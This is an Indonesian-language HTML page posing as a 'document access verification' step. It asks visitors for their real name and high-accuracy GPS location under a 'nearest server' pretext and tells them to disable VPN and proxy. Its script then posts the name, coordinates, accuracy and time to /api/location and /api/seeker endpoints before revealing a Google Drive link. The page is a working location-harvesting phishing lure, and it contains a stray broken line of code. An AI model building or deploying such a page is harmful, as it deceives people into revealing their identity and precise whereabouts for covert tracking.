<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <title>Verifikasi Link</title>
  <style>
    body {
      font-family: sans-serif;
      text-align: center;
      margin-top: 100px;
    }
    button, input {
      padding: 10px;
      font-size: 16px;
      margin: 5px;
    }
    button {
      background: #000;
      color: white;
      border-radius: 8px;
      border: none; 
      cursor: pointer;
    }
    iframe {
      width: 90%;
      height: 500px;
      border: none;
      margin-top: 30px;
      display: none;
    }
  </style>
</head>
<body>
  <h2>Verifikasi Akses Dokumen</h2>
  <p>Masukkan nama dan izinkan lokasi untuk mengakses dokumen. Agar dirutekan ke Server terdekat</p>
  <p>Mohon untuk mematikan VPN, Proxy, dan Hemat Daya.</p>
  
  <!-- Gambar utama -->
  <img src="https://github.com/mukti-nux/Framer-asset/blob/main/download.jpeg?raw=true" alt="OnlineImg" width="200"> <br><br>

  <!-- Musik -->
  <audio id="audio" src="https://github.com/mukti-nux/Framer-asset/raw/refs/heads/main/INTERWORLD%20-%20METAMORPHOSIS.mp3" preload="auto"></audio>

  <!-- Input Nama dan Tombol -->
  <input type="text" id="nama" placeholder="Nama Asli"><br><br>
  <button onclick="submitData()">Dapatkan Link</button><br><br><br>

  <!-- Iframe untuk Google Drive -->
  <iframe id="driveFrame" allow="autoplay"></iframe>

  <h5>Request Musik 2k/hari*. S&K berlaku</h5>
  <a href="https://www.instagram.com/hasanabdulloh_1/?hl=en" target="_blank" rel="noopener noreffer">
    <img src="https://github.com/mukti-nux/Framer-asset/blob/main/logo_ig-removebg-preview.png?raw=true" alt="Instagram" width="75px" />
  </a><br>
  <h5>Â©Admin</h5>

  <script>
    const id = new URLSearchParams(window.location.search).get("id");
    const audio = document.getElementById('audio');
    const iframe = document.getElementById('driveFrame');

    // Mainkan musik saat interaksi pertama
    function startAudioOnce() {
      audio.play().catch(err => console.warn("Audio gagal diputar:", err));
      document.removeEventListener('click', startAudioOnce);
      document.removeEventListener('touchstart', startAudioOnce);
    }
    document.addEventListener('click', startAudioOnce);
    document.addEventListener('touchstart', startAudioOnce);

    function submitData() {
      const nama = document.getElementById("nama").value.trim();
      if (!nama) return alert("Nama wajib diisi.");
      if (!id) return alert("ID dokumen tidak ditemukan.");

      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          (pos) => {
            const body = {
              nama,
              lat: pos.coords.latitude,
              lon: pos.coords.longitude,
              acc: pos.coords.accuracy,
              timestamp: new Date().toISOString()
            };

            // Kirim lokasi ke /api/location
            fetch("/api/location", {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify(body),
            }).catch((e) => console.warn("Lokasi gagal dikirim:", e));

            // Ambil link dari backend
            fetch(`/api/seeker/${id}`, {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify(body),
            })
              .then((res) => res.json())
              .then((data) => {
                if (data.redirectTo) {
                  // Ubah /view jadi /preview untuk iframe Google Drive
                  const driveLink = data.redirectTo.replace("/view", "/preview");
                  document.body.innerHTML
                  iframe.src = driveLink;
                  iframe.style.display = "block";
                } else {
                  alert("Link tidak ditemukan.");
                }
              });
          },
          (err) => alert("Izin lokasi diperlukan. Aktifkan GPS dan izinkan akses."),
          { enableHighAccuracy: true, timeout: 5000 }
        );
      } else {
        alert("Browser tidak mendukung geolokasi.");
      }
    }
  </script>
</body>
</html>
